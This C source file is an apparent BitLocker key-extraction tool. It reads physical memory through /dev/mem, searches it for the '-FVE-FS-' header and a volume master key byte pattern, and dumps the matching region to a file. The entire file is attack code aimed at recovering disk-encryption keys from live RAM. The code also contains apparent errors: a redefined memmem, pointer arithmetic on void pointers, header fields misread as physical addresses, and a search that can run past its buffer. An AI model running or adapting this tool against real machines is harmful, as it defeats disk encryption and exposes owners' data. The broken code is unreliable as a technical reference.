#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

// Constants for Memory Layout and Search Patterns
#define MEMORY_CHUNK_SIZE 0x200000  // 2MB chunk size to scan
#define VMK_HEADER_PATTERN "-FVE-FS-"  // VMK header string
#define VMK_NEEDLE_PATTERN "\x03\x20\x01\x00"  // VMK needle
#define MEMORY_SIZE 0x100000000  // Example: 4GB physical memory

// Function to simulate searching for a needle within a memory chunk
void* memmem(const void* haystack, size_t haystack_len, const void* needle, size_t needle_len) {
    unsigned char* h = (unsigned char*) haystack;
    unsigned char* n = (unsigned char*) needle;
    size_t i;
    
    for (i = 0; i <= haystack_len - needle_len; i++) {
        if (memcmp(&h[i], n, needle_len) == 0) {
            return (void*)&h[i];
        }
    }
    return NULL;
}

// Function to open /dev/mem (physical memory) for reading
int open_physical_memory() {
    int fd = open("/dev/mem", O_RDONLY);
    if (fd < 0) {
        perror("Failed to open /dev/mem");
        exit(1);
    }
    return fd;
}

// Function to read a memory region from physical memory
void* read_physical_memory(int fd, off_t addr, size_t size) {
    void* buffer = malloc(size);
    if (buffer == NULL) {
        perror("Failed to allocate buffer");
        exit(1);
    }

    // Seek to the memory address
    if (lseek(fd, addr, SEEK_SET) == -1) {
        perror("Failed to seek to physical address");
        exit(1);
    }

    // Read the memory into the buffer
    if (read(fd, buffer, size) != size) {
        perror("Failed to read physical memory");
        exit(1);
    }

    return buffer;
}

// Main function to capture live RAM and extract the VMK
int main() {
    printf("[+] Starting the VMK extraction process...\n");

    // Open /dev/mem for reading physical memory
    int fd = open_physical_memory();

    // Scan the memory chunk by chunk
    for (off_t addr = 0; addr < MEMORY_SIZE; addr += MEMORY_CHUNK_SIZE) {
        printf("[+] Scanning memory at address: %lx\n", addr);

        // Read the memory chunk
        void* memory_chunk = read_physical_memory(fd, addr, MEMORY_CHUNK_SIZE);

        // Search for the VMK header ("-FVE-FS-")
        void* pmd_vmk_hdr_addr = memmem(memory_chunk, MEMORY_CHUNK_SIZE, VMK_HEADER_PATTERN, strlen(VMK_HEADER_PATTERN));
        if (pmd_vmk_hdr_addr != NULL) {
            printf("[+] Found possible VMK header at address: %p\n", pmd_vmk_hdr_addr);

            // Extract version, start, and end from the VMK header
            uint32_t version = *(uint32_t*)(pmd_vmk_hdr_addr + 8 + 4);  // Version info
            uint32_t start = *(uint32_t*)(pmd_vmk_hdr_addr + 8 + 4 + 4);  // Start address
            uint32_t end = *(uint32_t*)(pmd_vmk_hdr_addr + 8 + 4 + 4 + 4);  // End address

            // Check for valid version and size
            if (version != 1 || end <= start) {
                printf("[+] Invalid VMK: version mismatch or invalid size (start: %d, end: %d)\n", start, end);
                continue;
            }

            printf("[+] Found VMK: version: %d, start: %p, end: %p\n", version, (void*)start, (void*)end);

            // Search for the VMK needle in the memory chunk
            void* pmd_vmk_addr = memmem(pmd_vmk_hdr_addr, end - start, VMK_NEEDLE_PATTERN, sizeof(VMK_NEEDLE_PATTERN));
            if (pmd_vmk_addr != NULL) {
                printf("[+] VMK needle found at address: %p\n", pmd_vmk_addr);

                // Extract VMK data starting from the 'start' address and ending at the 'end' address
                void* vmk_data = read_physical_memory(fd, start, end - start);
                printf("[+] VMK Data extracted successfully at: %p\n", vmk_data);

                // Optionally, write VMK to file
                FILE* output = fopen("extracted_vmk.bin", "wb");
                if (output) {
                    fwrite(vmk_data, 1, end - start, output);
                    fclose(output);
                    printf("[+] VMK data written to extracted_vmk.bin\n");
                } else {
                    perror("Failed to write VMK data to file");
                }

                free(vmk_data);
            } else {
                printf("[+] VMK needle not found in the memory region\n");
            }
        }

        // Free the memory chunk after scanning
        free(memory_chunk);
    }

    // Close the /dev/mem file descriptor
    close(fd);

    return 0;
}
